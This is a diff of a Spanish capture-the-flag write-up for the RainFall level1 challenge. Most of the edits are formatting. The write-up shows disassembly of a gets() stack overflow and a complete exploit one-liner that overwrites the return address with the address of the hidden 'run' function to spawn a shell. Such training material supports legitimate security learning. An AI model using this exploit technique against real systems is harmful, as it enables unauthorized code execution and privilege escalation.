@@ -85,7 +85,7 @@ Segmentation fault (core dumped)
 Entramos en GDB para entender la lógica interna y encontrar la vulnerabilidad o la "puerta trasera".
 
 ```
-level0@RainFall:~$ gdb ./level1 
+level1@RainFall:~$ gdb ./level1 
 (gdb) set disassembly-flavor intel
 (gdb) disas main
 
@@ -95,10 +95,10 @@ Dump of assembler code for function main:
    0x08048483 <+3>:	    and    esp,0xfffffff0
    0x08048486 <+6>:	    sub    esp,0x50
    0x08048489 <+9>:	    lea    eax,[esp+0x10]
-   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
-   0x08048490 <+16>:	call   0x8048340 <gets@plt>
-   0x08048495 <+21>:	leave  
-   0x08048496 <+22>:	ret    
+   0x0804848d <+13>:	  mov    DWORD PTR [esp],eax
+   0x08048490 <+16>:	  call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	  leave  
+   0x08048496 <+22>:	  ret    
 End of assembler dump.
 
 ```
@@ -115,7 +115,7 @@ Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://g
 0x08048490 <+16>:	    call   0x8048340 <gets@plt>
 ```
 - Reserva 80 bytes (buffer)
-- gets(): Lee una línea desde la entrada estándar (`stdin`) al búfer y no comprueba su tamaño.
+- **gets():** Lee una línea desde la entrada estándar (`stdin`) al búfer y no comprueba su tamaño.
 - Podriamos hacer shellcode
 
 2. **Identificamos el BACKDOOR**
@@ -126,7 +126,7 @@ All defined functions:
 
 Non-debugging symbols:
 0x080482f8  _init
-0x08048340  gets
+0x08048340  gets                      ⟸
 0x08048340  gets@plt
 0x08048350  fwrite
 0x08048350  fwrite@plt
@@ -163,7 +163,7 @@ Para tomar el control del EIP, debemos llenar el stack hasta alcanzar la direcci
 4. **EIP (Retorno):** Aquí inyectamos nuestra dirección.
 
 4. **Cálculo total de caracteres basura (Padding):**
- bytes.
+bytes.
 
 | Offset | Contenido | Valor |
 | --- | --- | --- |
@@ -176,7 +176,7 @@ Para tomar el control del EIP, debemos llenar el stack hasta alcanzar la direcci
 * **ASLR: OFF** -> La dirección `0x08048444` es estática y no cambia.
 
 6. **Ejecución del Exploit:**
-Usamos Python para enviar los bytes exactos incluyendo la dirección de la función `run` invertida (Little Endian):
+Usamos las shell enviar los bytes exactos incluyendo la dirección de la función `run` invertida (Little Endian):
 
 ```bash
 level1@RainFall:~$ (printf 'A%.0s' {1..76}; printf '\x44\x84\x04\x08'; cat) | ./level1 
@@ -210,8 +210,6 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 level2@RainFall:~$ 
 
 ```
-
-> **Nota:** Usamos `cat` al final del pipe para mantener el STDIN abierto; de lo contrario, la shell se cerraría instantáneamente al terminar el comando python.
 
 # 7. Conclusión:
 
